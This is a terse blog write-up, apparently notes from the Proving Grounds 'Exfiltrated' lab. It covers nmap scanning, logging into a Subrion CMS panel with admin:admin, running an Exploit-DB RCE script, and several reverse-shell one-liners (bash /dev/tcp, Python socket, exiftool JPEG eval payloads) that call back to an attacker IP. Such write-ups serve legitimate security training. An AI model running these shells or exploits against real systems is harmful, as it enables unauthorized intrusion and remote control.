---
layout: post
title:  "Write Up: Proving Grounds Practice - Exfiltrated"
date:   2024-07-23 17:37:51 -0400
categories: oscp proving-grounds TJNull
---

192.168.174.163

┌──(kali㉿kali)-[~/offsec/pg-practice/Exfiltrated]
└─$ sudo nmap -sV -sC -p- -oA Exfiltrated 192.168.169.163
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 19:16 EDT
Nmap scan report for 192.168.169.163
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/http://exfiltrated.offsec/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.56 seconds



sudo nmap -sV -sC -p- -oA Exfiltrated-2 http://exfiltrated.offsec/


=======================================================
http://exfiltrated.offsec/

http-title: Home :: Powered by Subrion 4.2

able to log into http://exfiltrated.offsec/panel/ with: admin:admin


found the following exploit: 
/usr/share/exploitdb/exploits/php/webapps/49876.py

python3 exploit.py -u http://exfiltrated.offsec/panel/ -l admin -p admin

got shell access: www-data

bash -i >& /dev/tcp/192.168.45.213/8080 0>&1

/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.213",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'



https://github.com/OneSecCyber/JPEG_RCE


 exiftool -config eval.config runme.jpg -eval="/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.213",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'" 
 
 
 
exiftool -config eval.config runme.jpg -eval='system("bash -c \"bash -i >& /dev/tcp/192.168.45.213/4444 0>&1\"")'
  
  
  
 0<&196;exec 196<>/dev/tcp/192.168.45.213/4444; sh <&196 >&196 2>&196
/bin/bash -l > /dev/tcp/192.168.45.213/4444 0<&1 2>&1
==================================================

gobuster dns -d exfiltrated.offsec -w /usr/share/wordlists/dirb/common.txt -o exfiltrated-dns --exclude-length 0




dirsearch -u http://exfiltrated.offsec/ -r -o dirsearch.txt
